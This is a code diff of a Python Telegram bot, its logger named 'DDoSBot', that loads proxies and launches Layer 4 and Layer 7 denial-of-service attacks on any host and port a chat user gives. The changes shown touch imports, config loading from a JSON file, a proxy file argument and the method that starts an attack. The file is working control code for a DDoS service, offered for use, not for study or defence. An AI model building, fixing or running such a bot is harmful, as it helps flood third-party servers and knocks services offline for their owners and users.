@@ -3,14 +3,18 @@ import asyncio
 from threading import Thread
 import socket
 from time import sleep
-from .proxy_manager import ProxyManager
-from .attack_methods import Layer4Attack, Layer7Attack
-from .config import config
+from proxy_manager import ProxyManager
+from attack_methods import Layer4Attack, Layer7Attack
+import json
 import logging
 import psutil
+from utils import humanbytes
 
 logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', level=logging.INFO)
 logger = logging.getLogger("DDoSBot")
+
+with open("config.json", "r") as f:
+    config = json.load(f)
 
 bot = telebot.TeleBot(config["telegram_token"])
 attacks = {}
@@ -18,7 +22,7 @@ proxies = set()
 
 async def load_proxies():
     global proxies
-    pm = ProxyManager(config["proxy_sources"])
+    pm = ProxyManager(config["proxy_sources"], config["proxy_file"])
     proxies = await pm.gather_proxies()
 
 def format_status(attack):
@@ -72,7 +76,7 @@ def attack(message):
             attack = Layer4Attack(host + ":" + port, method, proxies, config["default_threads"], duration)
 
         attack.event.set()
-        asyncio.run(attack.start())  # Chạy bất đồng bộ
+        asyncio.run(attack.run())  # Chạy bất đồng bộ
         attacks[message.chat.id] = attack
         bot.reply_to(message, (
             f"✅ *Attack Launched* ✅\n"
